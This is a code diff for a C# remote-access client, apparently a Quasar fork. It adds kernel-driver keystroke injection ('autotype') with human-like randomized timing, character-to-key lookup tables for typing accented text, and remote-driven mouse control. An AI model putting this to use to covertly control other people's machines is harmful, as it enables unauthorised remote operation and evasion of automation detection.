@@ -147,8 +147,585 @@ namespace Quasar.Client.Interception
         //    }
         //}
 
+        private static bool isInitialized = false;
+
         public static MouseHook mouseHook;
         public static KeyboardHook keyboardHook;
+        public static bool isAutoType = false;
+
+        private static void SendKey(Keys key, KeyState state, int sleepAfter = 0, int sleepBefore = 0)
+        {
+            if (sleepBefore > 0)
+            {
+                Thread.Sleep(sleepBefore);
+            }
+            keyboardHook.SetKeyState((InputInterceptorNS.KeyCode)key, state);
+            if (sleepAfter > 0)
+            {
+                Thread.Sleep(sleepAfter);
+            }
+        }
+
+        private static Keys[] SpecialCharacterToKeysEnum(char c)
+        {
+            if (c <= 'ü')
+            {
+                switch (c)
+                {
+                    case 'À':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.PageUp,
+                        Keys.Down
+                        };
+                    case 'Á':
+                    case 'Ã':
+                    case 'Å':
+                    case 'Ì':
+                    case 'Í':
+                    case 'Ð':
+                    case 'Ñ':
+                    case 'Ò':
+                    case 'Ó':
+                    case 'Õ':
+                    case 'Ö':
+                    case '×':
+                    case 'Ø':
+                    case 'Ú':
+                    case 'Ý':
+                    case 'Þ':
+                    case 'ß':
+                    case 'á':
+                    case 'ã':
+                    case 'å':
+                    case 'ì':
+                    case 'í':
+                    case 'ð':
+                    case 'ñ':
+                    case 'ò':
+                    case 'ó':
+                        break;
+                    case 'Â':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.PageUp,
+                        Keys.Left
+                        };
+                    case 'Ä':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.PageUp,
+                        Keys.Right
+                        };
+                    case 'Æ':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.PageUp,
+                        Keys.Up
+                        };
+                    case 'Ç':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.PageUp,
+                        Keys.PageUp
+                        };
+                    case 'È':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Insert,
+                        Keys.Insert
+                        };
+                    case 'É':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Insert,
+                        Keys.End
+                        };
+                    case 'Ê':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Insert,
+                        Keys.Down
+                        };
+                    case 'Ë':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Insert,
+                        Keys.PageDown
+                        };
+                    case 'Î':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Insert,
+                        Keys.Right
+                        };
+                    case 'Ï':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Insert,
+                        Keys.Home
+                        };
+                    case 'Ô':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.End,
+                        Keys.Down
+                        };
+                    case 'Ù':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.End,
+                        Keys.Home
+                        };
+                    case 'Û':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.End,
+                        Keys.PageUp
+                        };
+                    case 'Ü':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Down,
+                        Keys.Insert
+                        };
+                    case 'à':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Down,
+                        Keys.Left
+                        };
+                    case 'â':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Down,
+                        Keys.Right
+                        };
+                    case 'ä':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Down,
+                        Keys.Up
+                        };
+                    case 'æ':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.Insert
+                        };
+                    case 'ç':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.End
+                        };
+                    case 'è':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.Down
+                        };
+                    case 'é':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.PageDown
+                        };
+                    case 'ê':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.Left
+                        };
+                    case 'ë':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.Numpad5
+                        };
+                    case 'î':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.Up
+                        };
+                    case 'ï':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.PageDown,
+                        Keys.PageUp
+                        };
+                    case 'ô':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.Down,
+                        Keys.Left,
+                        Keys.Left
+                        };
+                    default:
+                        switch (c)
+                        {
+                            case 'ù':
+                                return new Keys[]
+                                {
+                            Keys.Insert,
+                            Keys.Down,
+                            Keys.Left,
+                            Keys.PageUp
+                                };
+                            case 'û':
+                                return new Keys[]
+                                {
+                            Keys.Insert,
+                            Keys.Down,
+                            Keys.Numpad5,
+                            Keys.End
+                                };
+                            case 'ü':
+                                return new Keys[]
+                                {
+                            Keys.Insert,
+                            Keys.Down,
+                            Keys.Numpad5,
+                            Keys.Down
+                                };
+                        }
+                        break;
+                }
+            }
+            else
+            {
+                if (c == 'Œ')
+                {
+                    return new Keys[]
+                    {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Left,
+                        Keys.Insert
+                    };
+                }
+                if (c == 'œ')
+                {
+                    return new Keys[]
+                    {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Numpad5,
+                        Keys.Right
+                    };
+                }
+                switch (c)
+                {
+                    case '–':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Numpad5,
+                        Keys.Insert
+                        };
+                    case '—':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Numpad5,
+                        Keys.End
+                        };
+                    case '‘':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Left,
+                        Keys.Numpad5
+                        };
+                    case '’':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Left,
+                        Keys.Right
+                        };
+                    case '“':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Left,
+                        Keys.Home
+                        };
+                    case '”':
+                        return new Keys[]
+                        {
+                        Keys.Insert,
+                        Keys.End,
+                        Keys.Left,
+                        Keys.Up
+                        };
+                }
+            }
+            return new Keys[]
+            {
+                Keys.DashUnderscore
+            };
+        }
+
+        private static Tuple<Keys, bool> CharacterToKeysEnum(char c)
+        {
+            switch (c)
+            {
+                case '\n':
+                    return new Tuple<Keys, bool>(Keys.Enter, false);
+                case ' ':
+                    return new Tuple<Keys, bool>(Keys.Space, true);
+                case '!':
+                    return new Tuple<Keys, bool>(Keys.One, true);
+                case '"':
+                    return new Tuple<Keys, bool>(Keys.SingleDoubleQuote, true);
+                case '#':
+                    return new Tuple<Keys, bool>(Keys.Three, true);
+                case '$':
+                    return new Tuple<Keys, bool>(Keys.Four, true);
+                case '%':
+                    return new Tuple<Keys, bool>(Keys.Five, true);
+                case '&':
+                    return new Tuple<Keys, bool>(Keys.Seven, true);
+                case '\'':
+                    return new Tuple<Keys, bool>(Keys.SingleDoubleQuote, false);
+                case '(':
+                    return new Tuple<Keys, bool>(Keys.Nine, true);
+                case ')':
+                    return new Tuple<Keys, bool>(Keys.Zero, true);
+                case '*':
+                    return new Tuple<Keys, bool>(Keys.Eight, true);
+                case '+':
+                    return new Tuple<Keys, bool>(Keys.PlusEquals, true);
+                case ',':
+                    return new Tuple<Keys, bool>(Keys.CommaLeftArrow, false);
+                case '-':
+                    return new Tuple<Keys, bool>(Keys.DashUnderscore, false);
+                case '.':
+                    return new Tuple<Keys, bool>(Keys.PeriodRightArrow, false);
+                case '/':
+                    return new Tuple<Keys, bool>(Keys.ForwardSlashQuestionMark, false);
+                case '0':
+                    return new Tuple<Keys, bool>(Keys.Zero, false);
+                case '1':
+                    return new Tuple<Keys, bool>(Keys.One, false);
+                case '2':
+                    return new Tuple<Keys, bool>(Keys.Two, false);
+                case '3':
+                    return new Tuple<Keys, bool>(Keys.Three, false);
+                case '4':
+                    return new Tuple<Keys, bool>(Keys.Four, false);
+                case '5':
+                    return new Tuple<Keys, bool>(Keys.Five, false);
+                case '6':
+                    return new Tuple<Keys, bool>(Keys.Six, false);
+                case '7':
+                    return new Tuple<Keys, bool>(Keys.Seven, false);
+                case '8':
+                    return new Tuple<Keys, bool>(Keys.Eight, false);
+                case '9':
+                    return new Tuple<Keys, bool>(Keys.Nine, false);
+                case ':':
+                    return new Tuple<Keys, bool>(Keys.SemicolonColon, true);
+                case ';':
+                    return new Tuple<Keys, bool>(Keys.SemicolonColon, false);
+                case '<':
+                    return new Tuple<Keys, bool>(Keys.CommaLeftArrow, true);
+                case '=':
+                    return new Tuple<Keys, bool>(Keys.PlusEquals, false);
+                case '>':
+                    return new Tuple<Keys, bool>(Keys.PeriodRightArrow, true);
+                case '?':
+                    return new Tuple<Keys, bool>(Keys.ForwardSlashQuestionMark, true);
+                case '@':
+                    return new Tuple<Keys, bool>(Keys.Two, true);
+                case 'A':
+                    return new Tuple<Keys, bool>(Keys.A, true);
+                case 'B':
+                    return new Tuple<Keys, bool>(Keys.B, true);
+                case 'C':
+                    return new Tuple<Keys, bool>(Keys.C, true);
+                case 'D':
+                    return new Tuple<Keys, bool>(Keys.D, true);
+                case 'E':
+                    return new Tuple<Keys, bool>(Keys.E, true);
+                case 'F':
+                    return new Tuple<Keys, bool>(Keys.F, true);
+                case 'G':
+                    return new Tuple<Keys, bool>(Keys.G, true);
+                case 'H':
+                    return new Tuple<Keys, bool>(Keys.H, true);
+                case 'I':
+                    return new Tuple<Keys, bool>(Keys.I, true);
+                case 'J':
+                    return new Tuple<Keys, bool>(Keys.J, true);
+                case 'K':
+                    return new Tuple<Keys, bool>(Keys.K, true);
+                case 'L':
+                    return new Tuple<Keys, bool>(Keys.L, true);
+                case 'M':
+                    return new Tuple<Keys, bool>(Keys.M, true);
+                case 'N':
+                    return new Tuple<Keys, bool>(Keys.N, true);
+                case 'O':
+                    return new Tuple<Keys, bool>(Keys.O, true);
+                case 'P':
+                    return new Tuple<Keys, bool>(Keys.P, true);
+                case 'Q':
+                    return new Tuple<Keys, bool>(Keys.Q, true);
+                case 'R':
+                    return new Tuple<Keys, bool>(Keys.R, true);
+                case 'S':
+                    return new Tuple<Keys, bool>(Keys.S, true);
+                case 'T':
+                    return new Tuple<Keys, bool>(Keys.T, true);
+                case 'U':
+                    return new Tuple<Keys, bool>(Keys.U, true);
+                case 'V':
+                    return new Tuple<Keys, bool>(Keys.V, true);
+                case 'W':
+                    return new Tuple<Keys, bool>(Keys.W, true);
+                case 'X':
+                    return new Tuple<Keys, bool>(Keys.X, true);
+                case 'Y':
+                    return new Tuple<Keys, bool>(Keys.Y, true);
+                case 'Z':
+                    return new Tuple<Keys, bool>(Keys.Z, true);
+                case '[':
+                    return new Tuple<Keys, bool>(Keys.OpenBracketBrace, false);
+                case '\\':
+                    return new Tuple<Keys, bool>(Keys.BackslashPipe, false);
+                case ']':
+                    return new Tuple<Keys, bool>(Keys.CloseBracketBrace, false);
+                case '^':
+                    return new Tuple<Keys, bool>(Keys.Six, true);
+                case '_':
+                    return new Tuple<Keys, bool>(Keys.DashUnderscore, true);
+                case '`':
+                    return new Tuple<Keys, bool>(Keys.Tilde, false);
+                case 'a':
+                    return new Tuple<Keys, bool>(Keys.A, false);
+                case 'b':
+                    return new Tuple<Keys, bool>(Keys.B, false);
+                case 'c':
+                    return new Tuple<Keys, bool>(Keys.C, false);
+                case 'd':
+                    return new Tuple<Keys, bool>(Keys.D, false);
+                case 'e':
+                    return new Tuple<Keys, bool>(Keys.E, false);
+                case 'f':
+                    return new Tuple<Keys, bool>(Keys.F, false);
+                case 'g':
+                    return new Tuple<Keys, bool>(Keys.G, false);
+                case 'h':
+                    return new Tuple<Keys, bool>(Keys.H, false);
+                case 'i':
+                    return new Tuple<Keys, bool>(Keys.I, false);
+                case 'j':
+                    return new Tuple<Keys, bool>(Keys.J, false);
+                case 'k':
+                    return new Tuple<Keys, bool>(Keys.K, false);
+                case 'l':
+                    return new Tuple<Keys, bool>(Keys.L, false);
+                case 'm':
+                    return new Tuple<Keys, bool>(Keys.M, false);
+                case 'n':
+                    return new Tuple<Keys, bool>(Keys.N, false);
+                case 'o':
+                    return new Tuple<Keys, bool>(Keys.O, false);
+                case 'p':
+                    return new Tuple<Keys, bool>(Keys.P, false);
+                case 'q':
+                    return new Tuple<Keys, bool>(Keys.Q, false);
+                case 'r':
+                    return new Tuple<Keys, bool>(Keys.R, false);
+                case 's':
+                    return new Tuple<Keys, bool>(Keys.S, false);
+                case 't':
+                    return new Tuple<Keys, bool>(Keys.T, false);
+                case 'u':
+                    return new Tuple<Keys, bool>(Keys.U, false);
+                case 'v':
+                    return new Tuple<Keys, bool>(Keys.V, false);
+                case 'w':
+                    return new Tuple<Keys, bool>(Keys.W, false);
+                case 'x':
+                    return new Tuple<Keys, bool>(Keys.X, false);
+                case 'y':
+                    return new Tuple<Keys, bool>(Keys.Y, false);
+                case 'z':
+                    return new Tuple<Keys, bool>(Keys.Z, false);
+                case '{':
+                    return new Tuple<Keys, bool>(Keys.OpenBracketBrace, true);
+                case '|':
+                    return new Tuple<Keys, bool>(Keys.BackslashPipe, true);
+                case '}':
+                    return new Tuple<Keys, bool>(Keys.CloseBracketBrace, true);
+                case '~':
+                    return new Tuple<Keys, bool>(Keys.Tilde, true);
+            }
+            return new Tuple<Keys, bool>(Keys.ForwardSlashQuestionMark, true);
+        }
+
 
         public static  Boolean InitializeDriver(ISender client)
         {
@@ -158,6 +735,7 @@ namespace Quasar.Client.Interception
                 {
                     mouseHook = new MouseHook(null);
                     keyboardHook = new KeyboardHook(null);
+                    isInitialized = true;
                     return true;
                 }
                 client.Send(new SetStatus { Message = "KB/M driver initialization failed!" });
@@ -597,37 +1175,86 @@ namespace Quasar.Client.Interception
             Quasar.Client.Interception.Keys keys;
             KeyState state;
             ConvertKeycodeToInterceptionKeys(keyCode, keyDown).Deconstruct(out keys, out state);
-            if (keyDown) InterceptionHelper.keyboardHook.SimulateKeyDown((InputInterceptorNS.KeyCode)keys);
-            else InterceptionHelper.keyboardHook.SimulateKeyUp((InputInterceptorNS.KeyCode)keys);
+            if (keyDown) keyboardHook.SimulateKeyDown((InputInterceptorNS.KeyCode)keys);
+            else keyboardHook.SimulateKeyUp((InputInterceptorNS.KeyCode)keys);
+        }
+
+        //public static void SendText(string text, ISender client, int minDelay=30, int maxDelay = 65)
+        //{
+        //    Random random = new Random();
+
+        //    keyboardHook.SimulateInput(text, random.Next(minDelay, maxDelay));
+        //}
+
+        public static void SendText(string text, ISender client,int minDelay = 30, int maxDelay = 65)
+        {
+            Random random = new Random();
+
+            if (isInitialized)
+            {
+                foreach (char c in text)
+                {
+                    if (!isAutoType)
+                    {
+                        break;
+                    }
+                    if ("ÀÂÄÆÇÈÉÊËÎÏÔŒÙÛÜàâäæçèéêëîïôœùûü–—‘’“”".IndexOf(c) >= 0)
+                    {
+                        Keys[] array = SpecialCharacterToKeysEnum(c);
+                        SendKey(Keys.RightAlt, KeyState.Down, random.Next(minDelay, maxDelay), 0);
+                        foreach (Keys key in array)
+                        {
+                            SendKey(key, KeyState.Down, minDelay, 0);
+                            SendKey(key, KeyState.Up, minDelay, 0);
+                        }
+                        SendKey(Keys.RightAlt, KeyState.Up,random.Next(minDelay, maxDelay), 0);
+                    }
+                    else
+                    {
+                        Tuple<Keys, bool> tuple = CharacterToKeysEnum(c);
+                        if (tuple.Item2)
+                        {
+                            SendKey(Keys.LeftShift, KeyState.Down, minDelay, 0);
+                        }
+                        SendKey(tuple.Item1, KeyState.Down, random.Next(minDelay, maxDelay), 0);
+                        SendKey(tuple.Item1, KeyState.Up, random.Next(minDelay, maxDelay), 0);
+                        if (tuple.Item2)
+                        {
+                            SendKey(Keys.LeftShift, KeyState.Up, minDelay, 0);
+                        }
+                    }
+                }
+                client.Send(new SetStatus { Message = "[+] Autotype done or stopped!" });
+            }
         }
 
         public static bool KernelDoMouseLeftClick(Point p, bool isMouseDown)
         {
             if (isMouseDown)
-                return InterceptionHelper.mouseHook.SimulateLeftButtonDown();
+                return mouseHook.SimulateLeftButtonDown();
             else
-                return InterceptionHelper.mouseHook.SimulateLeftButtonUp();
+                return mouseHook.SimulateLeftButtonUp();
         }
 
         public static bool KernelDoMouseRightClick(Point p, bool isMouseDown)
         {
             if (isMouseDown)
-                return InterceptionHelper.mouseHook.SimulateRightButtonDown();
+                return mouseHook.SimulateRightButtonDown();
             else
-                return InterceptionHelper.mouseHook.SimulateRightButtonUp();
+                return mouseHook.SimulateRightButtonUp();
         }
 
         public static bool KernelDoMouseMove(Point p)
         {
-            return InterceptionHelper.mouseHook.SetCursorPosition(p.X, p.Y);
+            return mouseHook.SetCursorPosition(p.X, p.Y);
         }
 
         public static bool KernelDoMouseScroll(Point p, bool scrollDown)
         {
             if (scrollDown)
-                return InterceptionHelper.mouseHook.SimulateScrollDown();
+                return mouseHook.SimulateScrollDown();
             else
-                return InterceptionHelper.mouseHook.SimulateScrollUp();
+                return mouseHook.SimulateScrollUp();
         }
     }
 
